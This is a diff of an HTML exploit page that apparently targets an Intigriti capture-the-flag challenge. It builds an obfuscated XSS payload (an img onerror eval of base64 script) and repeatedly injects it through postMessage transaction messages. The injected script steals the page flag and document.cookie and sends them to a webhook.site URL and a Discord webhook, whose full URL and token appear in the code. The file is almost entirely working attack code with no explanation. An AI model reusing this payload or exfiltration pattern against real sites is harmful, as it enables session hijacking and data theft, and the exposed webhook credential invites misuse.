@@ -6,110 +6,84 @@
 </head>
 <body style="background-color: #1a1a1a; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
 
-    <h1 style="color: #00FF88;">Exploit Loaded</h1>
-    <p>Attempting auto-execution...</p>
+    <h1>Exploit Running</h1>
+    <p>Please wait...</p>
+    <div id="log" style="font-family: monospace; color: #ccc;">Initializing...</div>
     
-    <button onclick="execute()" style="padding: 20px 40px; font-size: 20px; cursor: pointer; background: #5865F2; color: white; border: none; border-radius: 5px; font-weight: bold;">
-        LAUNCH MANUALLY 🚀
-    </button>
-    
-    <div id="log" style="margin-top: 20px; font-family: monospace; color: #ccc;">Initializing...</div>
+    <iframe id="targetFrame" src="https://challenge-0126.intigriti.io/checkout.html" style="width:800px; height:600px; border:2px solid #00FF88; margin-top: 20px;"></iframe>
 
     <script>
-        const TARGET_BASE = "https://challenge-0126.intigriti.io";
-        const CHECKOUT_URL = TARGET_BASE + "/checkout.html";
-        const MARKETWATCH_URL = TARGET_BASE + "/marketwatch.html";
-        
         const WEBHOOK_URL = "https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d";
         const DISCORD_URL = "https://discord.com/api/webhooks/1463231849550581891/xi0StB5ZOeisP2iDil0iuOYJzYhT6SYt4L4WWrEzgLqmJjSl0N5xyhrgX0zrjAq7q9o0";
+        const MARKETWATCH_URL = "https://challenge-0126.intigriti.io/marketwatch.html";
 
-        function log(msg) {
-            document.getElementById("log").innerText = msg;
-        }
+        function log(msg) { document.getElementById("log").innerText = msg; }
 
         const exfilScript = `
-            var hookSite = "${WEBHOOK_URL}";
-            var discordHook = "${DISCORD_URL}";
+            var hook = "${WEBHOOK_URL}";
+            var discord = "${DISCORD_URL}";
+            
+            new Image().src = hook + "?type=xss_fired";
 
-            function sendToDiscord(content) {
-                var data = JSON.stringify({
-                    username: "Flag Stealer",
-                    content: "🚩 **FLAG CAPTURED:** " + content
-                });
-                var blob = new Blob([data], { type: 'application/json' });
-                navigator.sendBeacon(discordHook, blob);
+            function sendDiscord(msg) {
+                var d = JSON.stringify({username:"FlagBot", content: msg});
+                var b = new Blob([d],{type:'application/json'});
+                navigator.sendBeacon(discord, b);
             }
 
             fetch('/checkout.html')
             .then(r => r.text())
             .then(html => {
                 var flag = "FLAG_NOT_FOUND";
-                if(html.indexOf("FLAG:") > -1) {
-                    var start = html.indexOf("FLAG:");
-                    flag = html.substring(start, start + 60);
+                if(html.indexOf("FLAG:") > -1) { 
+                    flag = html.substring(html.indexOf("FLAG:"), html.indexOf("FLAG:") + 60);
                 }
                 var cookies = document.cookie;
                 
-                var payload = new FormData();
-                payload.append('flag', flag);
-                payload.append('cookie', cookies);
-                navigator.sendBeacon(hookSite + "?type=data", payload);
-
-                sendToDiscord(flag + "\\n\\n🍪 Cookie: " + cookies);
+                var d = new FormData();
+                d.append('flag', flag);
+                d.append('cookie', cookies);
+                navigator.sendBeacon(hook + "?type=data", d);
+                
+                sendDiscord("FLAG CAPTURED: " + flag);
             })
             .catch(e => {
-                navigator.sendBeacon(hookSite + "?type=error&msg=" + btoa(e.toString()));
+                new Image().src = hook + "?type=error&msg=" + btoa(e.toString());
             });
         `;
 
         const base64Exfil = btoa(exfilScript);
         const xssPayload = `0x"><img src=x onerror=eval(atob('${base64Exfil}'))>`;
 
-        function execute() {
-            log("Opening target window...");
+        document.getElementById('targetFrame').onload = function() {
+            log("Iframe loaded. Sending payloads...");
             
-            let win = window.open(CHECKOUT_URL, "targetWindow");
-
-            if (!win) {
-                log("Popup blocked! Click the button above.");
-                return;
-            }
-
-            setTimeout(() => {
-                log("Spamming payloads...");
-
-                const currencies = ["1337COIN", "BTC", "XMR"];
-                let attempts = 0;
+            var win = this.contentWindow;
+            var attempts = 0;
+            
+            var interval = setInterval(() => {
+                attempts++;
                 
-                let interval = setInterval(() => {
-                    attempts++;
-                    let curr = currencies[attempts % currencies.length];
+                var curr = (attempts % 2 === 0) ? "1337COIN" : "BTC";
 
-                    try {
-                        win.postMessage({
-                            type: "submitTransaction",
-                            transaction: {
-                                currency: curr,
-                                amount: 1337,
-                                toAddress: xssPayload
-                            }
-                        }, "*");
-                    } catch(e) { console.log(e); }
-
-                    if (attempts % 5 === 0) log(`Sent ${attempts} payloads...`);
-
-                    if (attempts > 20) {
-                        clearInterval(interval);
-                        log("REDIRECTING Admin...");
-                        win.location.href = MARKETWATCH_URL;
-                        log("Exploit finished.");
+                win.postMessage({
+                    type: "submitTransaction",
+                    transaction: {
+                        currency: curr,
+                        amount: 1337,
+                        toAddress: xssPayload
                     }
-                }, 500);
+                }, "*");
 
-            }, 3500);
-        }
+                if (attempts % 5 === 0) log("Sent " + attempts + " payloads...");
 
-        window.onload = execute;
+                if (attempts > 15) {
+                    clearInterval(interval);
+                    log("Redirecting Iframe...");
+                    win.location = MARKETWATCH_URL;
+                }
+            }, 500);
+        };
     </script>
 </body>
 </html>
